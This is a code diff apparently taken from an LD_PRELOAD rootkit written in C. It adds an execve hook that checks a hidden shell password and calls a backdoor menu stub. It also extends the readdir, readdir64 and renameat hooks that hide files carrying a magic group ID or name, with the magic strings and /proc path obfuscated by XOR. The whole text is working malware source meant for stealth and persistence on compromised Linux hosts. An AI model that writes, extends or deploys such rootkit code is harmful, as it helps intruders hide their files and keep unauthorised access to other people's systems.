@@ -127,6 +127,27 @@ __attribute__ ((constructor)) static void init(void)
 	libc = dlopen(LIBC, RTLD_LAZY);
 }
 
+void menu()
+{ 
+
+}
+int execve(const char *path, char *const argv[], char *const envp[]) 
+{ 
+	HOOK(execve); 
+	#ifdef DEBUG
+	printf("[!] execve hooked\n"); 
+	#endif 
+
+	if (owned()) return old_execve(path, argv, envp);
+	char *shellpw = strdup(SHELLPW); xor(shellpw); 
+	if (argv[0] == shellpw) 
+	{ 
+		CLEAN(shellpw);
+		menu();
+	} 
+	return old_execve(path, argv, envp);
+} 
+
 long int ptrace(enum __ptrace_request request, ...)
 {
 	HOOK(ptrace);
@@ -571,7 +592,8 @@ size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
 	if (owned()) return old_fwrite(ptr, size, nmemb, stream);
 	struct stat filestat;	
 	old___fxstat(_STAT_VER, fileno(stream), &filestat);
-	if (filestat.st_gid == MAGIC){ 
+	if (filestat.st_gid == MAGIC)
+	{ 
 		return 0; 
 	} 
 	return old_fwrite(ptr, size, nmemb, stream);
@@ -619,16 +641,18 @@ int rename(const char *oldpath, const char *newpath)
 int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath)
 { 
 	HOOK(renameat); 
-	HOOK(__xstat);
+	HOOK(__fxstat);
 	#ifdef DEBUG
 	printf("[!] renameat hooked\n"); 
 	#endif
 	
 	if (owned()) return old_renameat(olddirfd, oldpath, newdirfd, newpath); 
 	char *magic = strdup(MAGIC); xor(magic); 
-	struct stat filestat; 
-	old___xstat(_STAT_VER, oldpath, &filestat); 
-	if (strstr(oldpath,  magic) || strstr(newpath, magic) || filestat.st_gid == MAGICGID)
+	struct stat filestat1;
+	struct stat filestat2; 	
+	old___fxstat(_STAT_VER, olddirfd, &filestat1);
+	old___fxstat(_STAT_VER, newdirfd, &filestat2); 
+	if ((strstr(oldpath,  magic) != NULL) || (strstr(newpath, magic) != NULL ) || filestat1.st_gid == MAGICGID || filestat2.st_gid == MAGICGID)
 	{ 
 		errno = ENOENT; 
 		return -1; 
@@ -651,6 +675,7 @@ struct dirent *readdir(DIR *dirp)
 	struct dirent *dir; 
 	struct stat filestat; 
 	char *magic = strdup(MAGIC); xor(magic);
+	char *proc_path = strdup(PROC_PATH); xor(proc_path);
 	if (owned()) return old_readdir(dirp); 
 	do 
 	{ 
@@ -663,13 +688,14 @@ struct dirent *readdir(DIR *dirp)
 			char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
 			memset(dirname, 0x0, sizeof(fdpath)); 
 			fd = dirfd(dirp); 
-			snprintf(fdpath, sizeof(fdpath) - 1, "/proc/self/fd/%d", fd); 
+			snprintf(fdpath, sizeof(fdpath) - 1, proc_path, fd); 
 			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
 			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
 			old___xstat(_STAT_VER, path, &filestat); 
 		} 
 	} while (dir && ((filestat.st_gid == MAGICGID)||(strstr(path, magic) != NULL))); 
 	CLEAN(magic);
+	CLEAN(proc_path);
 	return dir; 
 } 
 
@@ -685,6 +711,7 @@ struct dirent64 *readdir64(DIR *dirp)
 	struct dirent64 *dir; 
 	struct stat64 filestat; 
 	char *magic = strdup(MAGIC); xor(magic);
+	char *proc_path = strdup(PROC_PATH); xor(proc_path);
 	if (owned()) return old_readdir64(dirp); 
 	do 
 	{ 
@@ -697,7 +724,7 @@ struct dirent64 *readdir64(DIR *dirp)
 			char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
 			memset(dirname, 0x0, sizeof(fdpath)); 
 			fd = dirfd(dirp); 
-			snprintf(fdpath, sizeof(fdpath) - 1, "/proc/self/fd/%d", fd); 
+			snprintf(fdpath, sizeof(fdpath) - 1, proc_path, fd); 
 			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
 			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
 			old___xstat64(_STAT_VER, path, &filestat); 
